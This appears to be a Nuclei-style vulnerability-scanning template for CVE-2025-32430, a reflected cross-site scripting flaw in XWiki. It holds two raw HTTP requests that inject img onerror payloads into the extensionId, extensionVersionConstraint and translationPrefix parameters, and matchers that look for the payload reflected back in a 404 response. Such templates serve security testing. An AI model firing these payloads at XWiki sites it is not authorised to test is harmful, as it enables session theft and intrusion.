id: XWiki-CVE-2025-32430-ReflectXSS

info:
  name: XWiki-CVE-2025-32430-ReflectXSS
  author: iSee857
  severity: medium
  description: |
    XWiki-CVE-2025-32430-ReflectXSS
  tags: xss,xwiki

http:
  - raw:
      - |
        GET /xwiki/bin/view/Main/?xpage=distribution&extensionId=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E&extensionVersionConstraint=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 404
      - type: word
        words:
          - "<img src=x onerror=alert(document.cookie)>"

  - raw:
      - |
        GET /xwiki/bin/view/Main/?xpage=job_status_json&jobId=asdf&translationPrefix=%3Cimg%20src=1%20onerror=alert(document.domain)%3E HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 404
      - type: word
        words:
          - "<img src=1 onerror=alert(document.domain)>"